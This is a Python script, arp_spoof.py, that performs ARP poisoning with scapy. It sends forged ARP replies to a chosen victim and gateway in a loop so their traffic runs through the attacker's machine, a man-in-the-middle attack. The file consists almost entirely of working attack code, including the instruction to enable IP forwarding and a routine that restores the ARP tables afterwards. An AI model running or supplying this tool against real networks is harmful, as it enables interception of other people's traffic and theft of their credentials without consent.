# language: Python 3, file: arp_spoof.py, target: Linux (requires scapy + root)
# ARP poisoning — tricks victim into sending traffic through attacker (MITM).
# Enable IP forwarding before running: echo 1 > /proc/sys/net/ipv4/ip_forward
import time
import sys
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, getmacbyip

def get_mac(ip):
    mac = getmacbyip(ip)
    if not mac:
        print(f'[!] Could not resolve MAC for {ip}')
        sys.exit(1)
    return mac

def spoof(target_ip, spoof_ip, iface):
    target_mac = get_mac(target_ip)
    attacker_mac = get_if_hwaddr(iface)
    pkt = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=spoof_ip, hwsrc=attacker_mac
    )
    sendp(pkt, iface=iface, verbose=False)

def restore(target_ip, gateway_ip, iface):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    pkt = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=gateway_ip, hwsrc=gateway_mac
    )
    sendp(pkt, iface=iface, count=5, verbose=False)

def main():
    iface = input('Interface (ex: eth0): ').strip()
    victim = input('Victim IP: ').strip()
    gateway = input('Gateway IP: ').strip()
    interval = float(input('Interval seconds (ex: 1.5): ').strip())
    print(f'[*] ARP spoofing {victim} <-> {gateway} on {iface}')
    print('[*] Ctrl+C to stop and restore ARP tables')
    try:
        while True:
            spoof(victim, gateway, iface)     # tell victim we are gateway
            spoof(gateway, victim, iface)     # tell gateway we are victim
            time.sleep(interval)
    except KeyboardInterrupt:
        print('\n[*] Restoring ARP tables...')
        restore(victim, gateway, iface)
        restore(gateway, victim, iface)
        print('[+] Done.')

if __name__ == '__main__':
    main()
